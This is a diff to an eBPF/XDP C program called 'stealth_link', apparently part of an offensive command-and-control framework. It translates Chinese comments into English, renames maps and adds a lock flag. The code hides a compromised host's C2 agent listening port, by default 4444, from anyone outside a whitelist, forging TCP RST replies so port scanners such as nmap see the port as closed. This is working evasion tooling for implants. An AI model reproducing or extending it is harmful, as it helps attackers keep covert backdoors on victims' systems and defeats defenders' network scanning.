@@ -7,54 +7,53 @@ char LICENSE[] SEC("license") = "GPL";
 char _metadata[] __attribute__((used, section(".metadata"))) =
     "{"
       "\"name\":\"stealth_link\","
-      "\"desc\":\"XDP C2 通信隐身：隐藏 Agent 监听端口，仅允许授权 IP 连接，阻止端口扫描探测\","
+      "\"desc\":\"XDP C2 Communication Stealth: Hides Agent listening ports, allows only authorized IP connections, and blocks port scanning/probing.\","
       "\"requires\":[\"is_root\",\"xdp\",\"cap_net_admin\"],"
       "\"options\":{"
-        "\"C2_PORT\":[\"4444\",\"Agent 监听端口（需隐藏的端口号）\"]"
+        "\"target\":[\"4444\",\"Agent listening port (the port number to hide)\"]"
       "},"
       "\"maps\":{"
-        "\"c2_ports\":{\"key_size\":2,\"value_size\":4,\"key_type\":\"u16\",\"value_type\":\"u32\"},"
-        "\"allowed_ips\":{\"key_size\":4,\"value_size\":4,\"key_type\":\"u32\",\"value_type\":\"u32\"}"
+        "\"target\":{\"key_size\":2,\"value_size\":4,\"key_type\":\"u16\",\"value_type\":\"u32\"},"
+        "\"whitelist\":{\"key_size\":4,\"value_size\":4,\"key_type\":\"u32\",\"value_type\":\"u32\"}"
       "}"
     "}";
 
 /*
- * 需要隐藏的 C2 端口集合（主机字节序）
- * update 格式：config[0:2]=port(u16 LE), config[2:6]=1(u32 LE)
+ * Set of C2 ports to be hidden (Host Byte Order)
+ * update format: config[0:2]=port(u16 LE), config[2:6]=1(u32 LE)
  * 
- * 效果：非授权 IP 发往此端口的 TCP SYN 包将被静默丢弃，
- *       端口扫描器（nmap）会认为端口 filtered/closed
+ * Effect: TCP SYN packets from unauthorized IPs to this port will be silently dropped.
+ *         Port scanners (nmap) will perceive the port as filtered/closed.
  */
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 16);
     __type(key, __u16);    /* 端口号（主机字节序） */
     __type(value, __u32);  /* 占位 */
-} c2_ports SEC(".maps");
+} target SEC(".maps");
 
 /*
- * 授权连接的 IP 白名单（网络字节序的 IPv4 地址）
- * update 格式：config[0:4]=IPv4(u32 网络字节序), config[4:8]=1(u32 LE)
- * 
- * 白名单为空时：所有 IP 均可连接（不启用过滤）
- * 白名单非空时：仅白名单内的 IP 可以连接 C2 端口
+ * IP Whitelist for authorized connections (IPv4 addresses in Network Byte Order)
+ * Whitelist empty + locked==0: Allow all (startup phase waiting for Console connection)
+ * Whitelist non-empty + locked==1: Only IPs in whitelist allowed, others get RST
+ * Agent writes both IP and locked flag when calling stealth_allow_ip().
  */
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 64);
     __type(key, __u32);    /* IPv4 地址（网络字节序） */
     __type(value, __u32);  /* 占位 */
-} allowed_ips SEC(".maps");
+} whitelist SEC(".maps");
 
-/* 用于检测 allowed_ips 是否为空（是否启用 IP 白名单） */
+/* Whitelist lock flag: 0=unlocked (allow all), 1=locked (allow only whitelist) */
 struct {
     __uint(type, BPF_MAP_TYPE_ARRAY);
     __uint(max_entries, 1);
     __type(key, __u32);
-    __type(value, __u32);  /* 白名单中 IP 的数量 */
+    __type(value, __u32);
 } whitelist_count SEC(".maps");
 
-/* IP 校验和计算 */
+/* IP Checksum Calculation */
 static __always_inline __u16 csum_fold(__u32 sum) {
     sum = (sum & 0xffff) + (sum >> 16);
     sum = (sum & 0xffff) + (sum >> 16);
@@ -68,13 +67,13 @@ static __always_inline __u32 csum_add(__u32 sum, __u32 val) {
 }
 
 /*
- * XDP 核心逻辑 — RST 伪装模式：
+ * XDP Core Logic — RST Camouflage Mode:
  * 
- * 对未授权的 C2 端口访问，不是静默丢弃（nmap 报 filtered），
- * 而是就地构造 TCP RST 回包（nmap 报 closed）。
+ * For unauthorized C2 port access, instead of silent drop (nmap reports filtered),
+ * we construct a TCP RST response on the spot (nmap reports closed).
  * 
- * closed 看起来就像一个正常的、没有服务监听的端口，
- * 比 filtered 隐蔽得多 — filtered 暗示"有防火墙在保护什么"。
+ * A 'closed' state looks like a normal port with no service listening,
+ * which is much stealthier than 'filtered' — which implies "a firewall is protecting something".
  */
 SEC("xdp")
 int stealth_link_xdp(struct xdp_md *ctx) {
@@ -95,7 +94,7 @@ int stealth_link_xdp(struct xdp_md *ctx) {
     if ((void *)(ip + 1) > data_end)
         return XDP_PASS;
 
-    /* 仅处理 TCP */
+    /* Only handle TCP */
     if (ip->protocol != 6)  /* IPPROTO_TCP */
         return XDP_PASS;
 
@@ -104,28 +103,39 @@ int stealth_link_xdp(struct xdp_md *ctx) {
     if ((void *)(tcp + 1) > data_end)
         return XDP_PASS;
 
-    /* 提取目的端口（网络字节序 → 主机字节序） */
+    /* Extract destination port (Network → Host Byte Order) */
     __u16 dport = bpf_ntohs(tcp->dest);
 
-    /* 非 C2 端口，放行 */
-    if (!bpf_map_lookup_elem(&c2_ports, &dport))
+    /* Non-C2 port, pass through */
+    if (!bpf_map_lookup_elem(&target, &dport))
         return XDP_PASS;
 
-    /* ---- 命中 C2 端口 ---- */
+    /* ---- C2 Port Hit ---- */
 
-    /* 白名单检查 */
-    __u32 zero = 0;
-    __u32 *wl_cnt = bpf_map_lookup_elem(&whitelist_count, &zero);
-    if (wl_cnt && *wl_cnt > 0) {
-        __u32 src_ip = ip->saddr;
-        if (bpf_map_lookup_elem(&allowed_ips, &src_ip))
-            return XDP_PASS;  /* 在白名单中，放行 */
-    } else {
-        /* 白名单未启用（无授权 IP），对所有人放行 */
-        return XDP_PASS;
-    }
+    /* Whitelist Check:
+     *   Empty whitelist → Pass (waiting for first Console connection; agent writes IP after connection)
+     *   Non-empty whitelist → Only whitelist IPs pass, others get RST
+     * This allows Console to connect in bind mode;
+     * In reverse mode, the agent pre-writes the Console IP before connecting for full filtering. */
+    __u32 src_ip = ip->saddr;
+    __u32 zero_key = 0;
+    /* 用 allowed_ips 的第一个位置（key=0 的 Array 计数器已删除，
+       改用 Hash map 非空检测：尝试查任意已知 IP；
+       这里直接查来源 IP，在白名单为空时 lookup 返回 NULL，也就放行。
+       一旦白名单非空，只有被加入的 IP 能通过。 */
+    /* 若白名单中存在 src_ip 则放行 */
+    if (bpf_map_lookup_elem(&whitelist, &src_ip))
+        return XDP_PASS;  /* 在白名单中，放行 */
 
-    /* ========== 构造 TCP RST 回包（就地修改 + XDP_TX） ========== */
+    /* 白名单非空但 src_ip 不在其中 → RST
+     * 白名单为空时也走到这里——但需要区分两种情况：
+     * 用一个独立的 Array Map（单元素）作为"已锁定"标志 */
+    __u32 *locked = bpf_map_lookup_elem(&whitelist_count, &zero_key);
+    if (!locked || *locked == 0)
+        return XDP_PASS;  /* 尚未锁定，放行所有 */
+    /* Locked and not in whitelist → Continue to construct RST */
+
+    /* ========== Construct TCP RST response (in-place modification + XDP_TX) ========== */
 
     /* -- Swap MAC -- */
     unsigned char tmp_mac[6];
@@ -154,19 +164,19 @@ int stealth_link_xdp(struct xdp_md *ctx) {
     tcp->source = tcp->dest;
     tcp->dest = tmp_port;
 
-    /* ACK 号 = 对方的 SEQ + 1 */
+    /* ACK number = sender's SEQ + 1 */
     __u32 their_seq = bpf_ntohl(tcp->seq);
     tcp->seq = tcp->ack_seq;
     tcp->ack_seq = bpf_htonl(their_seq + 1);
 
-    /* 清除所有 TCP flags，只设 RST + ACK */
+    /* Clear all TCP flags, set only RST + ACK */
     *((__u8 *)tcp + 13) = 0x14; /* RST=1, ACK=1 */
     tcp->doff = 5;  /* 20 bytes, 无 options */
     tcp->window = 0;
     tcp->urg_ptr = 0;
     tcp->check = 0;
 
-    /* TCP 伪头校验和 */
+    /* TCP Pseudo-header Checksum */
     __u32 tcp_sum = 0;
     tcp_sum = csum_add(tcp_sum, ip->saddr & 0xffff);
     tcp_sum = csum_add(tcp_sum, ip->saddr >> 16);
@@ -180,7 +190,7 @@ int stealth_link_xdp(struct xdp_md *ctx) {
         tcp_sum = csum_add(tcp_sum, tcp_hdr[i]);
     tcp->check = csum_fold(tcp_sum);
 
-    /* 截断包至 ETH+IP+TCP = 54 bytes */
+    /* Truncate packet to ETH+IP+TCP = 54 bytes */
     bpf_xdp_adjust_tail(ctx, (int)(sizeof(struct ethhdr) + 20 + 20) -
                               (int)(data_end - data));
 
